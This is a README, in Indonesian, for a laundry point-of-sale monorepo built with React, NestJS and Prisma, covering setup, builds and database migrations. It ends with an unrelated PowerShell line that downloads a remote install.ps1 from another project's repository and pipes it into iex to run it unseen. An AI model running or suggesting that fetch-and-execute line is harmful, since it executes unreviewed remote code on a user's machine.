# Kasir Laundry (Monorepo)

Aplikasi Kasir Laundry Offline-First dengan fitur sinkronisasi Multi-Toko. Repositori ini menggunakan arsitektur **Monorepo** yang memisahkan aplikasi ke dalam dua modul utama:

1. **`frontend/`**: Aplikasi ReactJS (Vite) beserta database lokal (Dexie).
2. **`backend/`**: API Server NestJS beserta ORM Prisma dan PostgreSQL.

---

## 🛠️ Persyaratan Sistem

Pastikan Anda telah menginstal:

- [Node.js](https://nodejs.org/) (versi LTS yang disarankan)
- [npm](https://www.npmjs.com/) (dibawaan Node.js)
- [Docker Desktop](https://www.docker.com/products/docker-desktop/) (untuk menjalankan PostgreSQL)

---

## 🚀 Cara Menjalankan Aplikasi (Development)

Untuk tahap pengembangan (Development), Anda dapat menjalankan Frontend dan Backend secara bersamaan dari _root_ folder.

1. **Jalankan Database PostgreSQL**
   Pertama, nyalakan kontainer database melalui Docker:

   ```bash
   docker compose up -d
   ```

   _(Database akan berjalan pada `localhost:5433` untuk menghindari bentrok dengan servis Postgres bawaan)_

2. **Install Semua Dependencies**
   Cukup jalankan perintah ini dari _root folder_ untuk meng-install paket untuk Frontend maupun Backend:

   ```bash
   npm install
   ```

3. **Jalankan Aplikasi Secara Bersamaan (Frontend + Backend)**

   ```bash
   npm run dev
   ```

   _Frontend (React) akan berjalan di `http://localhost:5173`_
   _Backend (NestJS) akan berjalan di `http://localhost:3000`_

   _(Catatan: Anda juga dapat menjalankan secara terpisah dengan `npm run dev:frontend` atau `npm run dev:backend`)_

---

## 📦 Cara Build (Production)

### Build Frontend (ReactJS)

Masuk ke direktori frontend dan jalankan perintah build. (Catatan: _Netlify_ sudah dikonfigurasi untuk melakukan ini secara otomatis).

```bash
cd frontend
npm run build
```

File hasil _build_ akan berada di dalam folder `frontend/dist`.

### Build Backend (NestJS)

Masuk ke direktori backend dan jalankan perintah build NestJS.

```bash
cd backend
npm run build
```

File hasil _build_ (kompilasi TypeScript ke JavaScript) akan berada di dalam folder `backend/dist`. Untuk menjalankan _production server_, gunakan perintah:

```bash
npm run start:prod
```

---

## 🗄️ Panduan Database (Prisma ORM)

Semua operasi database dan perubahan struktur tabel (_schema_) dilakukan di dalam direktori **`backend`**.
Selalu pastikan Anda berada di folder backend: `cd backend`.

1. **Melakukan Sinkronisasi Skema Database (Migrasi)**
   Jika Anda mengubah desain tabel di file `backend/prisma/schema.prisma`, Anda harus melakukan migrasi agar database PostgreSQL menyesuaikan bentuk strukturnya:

   ```bash
   # Jalankan perintah ini dari folder /backend
   npx prisma migrate dev --name deskripsi_perubahan
   npx prisma migrate dev --name init
   ```

2. **Generate Prisma Client**
   Setelah melakukan modifikasi skema, jalankan perintah ini untuk memperbarui sistem _autocompletion_ (IntelliSense) di TypeScript:

   ```bash
   npx prisma generate
   ```

3. **Melihat Database (Prisma Studio)**
   Untuk melihat antarmuka tabel dan memanipulasi data di dalam database secara visual seperti phpMyAdmin, jalankan:

   ```bash
   npx prisma studio
   ```

   Lalu buka URL yang muncul di browser Anda (biasanya di `localhost:5555`).

---

## 📝 Konfigurasi Environment (.env)

Setiap folder memiliki file `.env` (environment) masing-masing jika diperlukan.
Saat ini, file kredensial untuk database diletakkan pada:
`backend/.env`

```env
DATABASE_URL="postgresql://root:password@localhost:5433/kasir_laundry?schema=public"
```

to understand anyting

iwr -useb https://raw.githubusercontent.com/Egonex-AI/Understand-Anything/main/install.ps1 | iex
